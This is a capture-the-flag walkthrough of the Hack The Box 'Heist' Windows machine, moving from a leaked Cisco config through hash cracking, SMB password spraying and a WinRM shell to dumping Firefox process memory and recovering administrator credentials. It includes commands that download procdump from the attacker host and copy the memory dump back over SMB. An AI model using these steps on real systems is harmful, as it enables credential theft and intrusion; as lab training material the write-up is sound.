---
{"dg-publish":true,"permalink":"/ct-fs/htb/heist/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #cisco #leaked_creds #procdump #firefox #plaintext_creds

## Recon
![Pasted image 20260925095913.png](/img/user/Pasted%20image%2020260925095913.png)

### Nmap:
```zsh
nmap -p135,80,445,5985,49669 -sV -sC -T4 -Pn -oA 10.129.96.157 10.129.96.157
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-25 12:58 -0400
Nmap scan report for 10.129.96.157
Host is up (0.089s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Support Login Page
|_Requested resource was login.php
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-09-25T16:59:51
|_  start_date: N/A
|_clock-skew: -2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.50 seconds
```
Port scanning shows a webserver on 80, SMB on 135 and 445, Mirosoft-HTTPAPI on 5985, and msrpc on 49669. 
### Port 80 (web)
#### Manual Enumeration
![Pasted image 20260925100246.png](/img/user/Pasted%20image%2020260925100246.png)
Visiting the web server in the browser we find a login portal with the message "24 x 7 support" at the bottom. Wappalyzer shows it's running IIS as well as PHP 7.3.1 and various JS functions. At the bottom of the login form we can see the option to "login as Guest"

![Pasted image 20260925101506.png](/img/user/Pasted%20image%2020260925101506.png)
It brings us to an "issues" message board with an attachment from a customer that contains part of their Cisco router configuration. They state that the previous admin had used it in the past.

```zsh
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```
In the attachment we appear to have what is an abbreviated config dump from a cisco router. There also appears to be hardcoded creds inside.

## Initial Access (leaked credentials)

```zsh
┌──(kali㉿kali)-[~/…/HTB/heist/files/hashes]
└─$ john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt cisco.hash    
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)     
1g 0:00:00:06 DONE (2026-09-25 13:18) 0.1449g/s 508048p/s 508048c/s 508048C/s stealthy001..ste88dup
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
offloading that hash to `jtr` we immediately crack it for the admin's password. Also we know from the message chain that the user `Hazard` has requested that they make them a user on the target server.

![Pasted image 20260925112312.png](/img/user/Pasted%20image%2020260925112312.png)
![Pasted image 20260925112606.png](/img/user/Pasted%20image%2020260925112606.png)
We also notice a couple of Cisco type 7 encoded passwords in the file. I was able to find a [decoder](https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html) online and successfully decoded the `admin` and `rout3r` ones.

```zsh
┌──(kali㉿kali)-[~/…/HTB/heist/files/hashes]
└─$ nxc smb 10.129.96.157 -u 'Hazard' -p 'stealth1agent'          
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:None)
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
```
We successfully authenticate to the server as user `Hazard` with the hash we cracked.

### SMB Enumeration
#### Hazard
```zsh
┌──(kali㉿kali)-[~/…/HTB/heist/files/hashes]
└─$ nxc smb 10.129.96.157 -u 'Hazard' -p 'stealth1agent' --shares 
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:None)
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
SMB         10.129.96.157   445    SUPPORTDESK      [*] Enumerated shares
SMB         10.129.96.157   445    SUPPORTDESK      Share           Permissions     Remark
SMB         10.129.96.157   445    SUPPORTDESK      -----           -----------     ------
SMB         10.129.96.157   445    SUPPORTDESK      ADMIN$                          Remote Admin
SMB         10.129.96.157   445    SUPPORTDESK      C$                              Default share
SMB         10.129.96.157   445    SUPPORTDESK      IPC$            READ            Remote IPC
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/HTB/heist/files/hashes]
└─$ nxc smb 10.129.96.157 -u 'Hazard' -p 'stealth1agent' --users 
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:None)
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/…/HTB/heist/files/hashes]
└─$ nxc smb 10.129.96.157 -u 'Hazard' -p 'stealth1agent' --rid-brute
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:None)
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
SMB         10.129.96.157   445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.129.96.157   445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)

```
Enumerating our share access and valid users we see that we don't have access to much, but we are able to bruteforce several valid users.

```zsh
└─$ nxc smb SUPPORTDESK -u users.txt -p 'Q4)sJu\Y8qz*A3?d'
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:None)
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Windows:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Administrator:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Guest:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\DefaultAccount:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\WDAGUtilityAccount:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\None:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?**d**
```
We are then able to password spray that decoded cisco admin password and successfully auth to the server as `Chase`.

### WinRM
#### Chase
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/heist/scanning]
└─$ evil-winrm -i SUPPORTDESK -u chase -p 'Q4)sJu\Y8qz*A3?d'                              
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents> 
```
With Chase's stolen password we successfully gain a WinRM shell on the server.

```zsh
*Evil-WinRM* PS C:\Users\Chase> dir Desktop


    Directory: C:\Users\Chase\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2019   9:08 AM            121 todo.txt
-ar---        9/25/2026  10:23 PM             34 user.txt


```
In Chase's Desktop folder we see `user.txt` flag and a todo list called `todo.txt`.

## Privilege Escalation (dumping creds from memory)

```zsh
*Evil-WinRM* PS C:\Users\Chase> type Desktop/todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```
Inside `todo.txt` we find reminders to keep checking the issues list and to fix the router config. Presumably the config we found earlier. For now let's keep digging.

```zsh
*Evil-WinRM* PS C:\Users\Chase> ls AppData/Local/Mozilla


    Directory: C:\Users\Chase\AppData\Local\Mozilla


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/22/2019   8:01 AM                Firefox
```

```zsh
*Evil-WinRM* PS C:\Users\Chase\Documents> get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    470      18     2248       5384               360   0 csrss
    291      13     2136       5084               472   1 csrss
    357      15     3480      14624              5040   1 ctfmon
    253      14     3888      13360              3884   0 dllhost
    166       9     1868       9764       0.05   6880   1 dllhost
    615      32    30132      57536               960   1 dwm
   1492      58    23656      77332              4408   1 explorer
    355      25    16412     296388       0.13   6096   1 firefox
   1073      71   158992     463536       3.97   6548   1 firefox
    347      19    10212     286384       0.09   6656   1 firefox
    401      33    31548     314644       0.47   6792   1 firefox
    378      28    22500     306008       0.31   7028   1 firefox
     49       6     1792       4652               772   1 fontdrvhost
     49       6     1496       3876               780   0 fontdrvhost
      0       0       56          8                 0   0 Idle
    995      23     6080      15184               624   0 lsass
    223      13     3088      10316              3868   0 msdtc
      0      12      296      13968                88   0 Registry
    145       8     1616       7544              5680   1 RuntimeBroker
    303      16     5588      16964              5808   1 RuntimeBroker
    273      14     3072      15128              5868   1 RuntimeBroker
    663      32    19688      46872              5632   1 SearchUI
    528      11     4860       9556               604   0 services
    688      29    15012      38984              5524   1 ShellExperienceHost
    436      17     4980      24136              4784   1 sihost
     53       3      520       1136               264   0 smss
    471      23     5872      16420              2404   0 spoolsv
    286      13     4480      11452                68   0 svchost
    149       9     1720      11700               600   0 svchost
    199      12     2028       9672               688   0 svchost
     85       5      896       3796               724   0 svchost
    117       7     1292       5524               740   0 svchost
    858      20     6940      22600               744   0 svchost
    860      16     5296      11768               856   0 svchost
    253      11     1972       7684               908   0 svchost
    378      13    11260      15252              1084   0 svchost
    140       7     1304       5656              1172   0 svchost

```
After some digging we find that `Chase` has firefox installed for his user and must be what he's checking continuously for the issues list. Checking the running processes we see it's the only browser running.

```zsh
*Evil-WinRM* PS C:\Users\Chase> wget http://10.10.14.89:8090/procdump.exe -Outfile procdump.exe

*Evil-WinRM* PS C:\Users\Chase> ./procdump.exe -accepteula -ma 6548 firefox_dump.dump

```
We download `procdump.exe` from our attacker machine over to the target and run a full dump on the firefox process using far-and-away the most CPU power at the moment.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/heist/loot]
└─$ impacket-smbserver share . -smb2support  
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

*Evil-WinRM* PS C:\Users\Chase> Copy-Item .\firefox_dump.dump.dmp -Destination "\\10.10.14.89\share\"
```
We then setup an SMB share on our device and send the dump file back to it via `Copy-Item` from our `evil-winrm` session.


```zsh
---Snip--
��0����������������������������x:http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=��������������������x:http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=���������������������a*>��h� ��4����*>��L1!��b�����*>�� � ��3����!+>��4� ��0����������������������������x...P....[tlsflags0x00000000]localhost:80^privateBrowsingId=1������������������������������������������������������������񽿅�h� ��4����!����L1!��b����Q���� � ��3���偾���4� ��0����������������������������H
---Snip---

```
Inside is a lot of memory output but we are able to use `grep` specifying `admin@` as our search string and we find plaintext credentials.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/heist/scanning]
└─$ evil-winrm -i SUPPORTDESK -u Administrator -p '4dD!5}x/re8]FBuZ'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/25/2026  10:23 PM             34 root.txt

```
And just like that, we try the creds and get a shell as the `Administrator` on the sever. pwned.


## Final Thoughts
>[!Takeaways]
>- Be more informed about common technologies and their password schemes (i.e. Cisco type 7 password encoding)
>- If you need more clues while on a target, check to see your User's `App Data` folder to see what programs they use locally
>- Whenever someone is accessing a browser regularly be sure to dump the process memory with `procdump`

